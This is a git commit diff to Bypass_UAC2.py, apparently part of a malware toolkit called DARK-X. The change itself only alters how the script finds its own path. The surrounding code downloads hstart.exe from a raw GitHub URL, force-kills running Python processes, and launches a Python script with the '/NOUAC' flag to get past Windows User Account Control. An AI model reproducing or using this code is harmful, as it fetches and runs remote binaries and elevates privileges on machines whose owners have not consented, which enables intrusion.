4cd028098be28681e6cba658c6e75ba1cb6c7771
UQABXO <92090431+UQABXO@users.noreply.github.com>
2022-04-06 12:52:53 +0300

    Update Bypass_UAC2.py

--- Bypass_UAC2.py
+++ Bypass_UAC2.py
@@ -4,6 +4,7 @@ import tempfile
 from subprocess import Popen,PIPE
 class Bypass_UAC2():
 	def __init__(self,_):
+		self.__file__ = _.__file__
 		self.program = _.program
 		self.hstart = "https://raw.githubusercontent.com/UQABXO/DARK-X/main/bin/hstart.exe"
 		self.Main()
@@ -18,6 +19,6 @@ class Bypass_UAC2():
 		file.write(req.content)
 		file.close()
 
-		python = "\\".join(os.path.abspath(__file__).split("\\")[:-1]) + "\\python.exe"
-		me = "\\".join(os.path.abspath(__file__).split("\\")[:-1]) + "\\New.py"
+		python = "\\".join(os.path.abspath(self.__file__).split("\\")[:-1]) + "\\python.exe"
+		me = "\\".join(os.path.abspath(self.__file__).split("\\")[:-1]) + "\\New.py"
 		sub = Popen(["cmd.exe","/c","taskkill","/IM","python.exe","/F","&",filename, '/NOCONSOLE', '/NOUAC', python + " " + me + " " + self.program], shell=True)
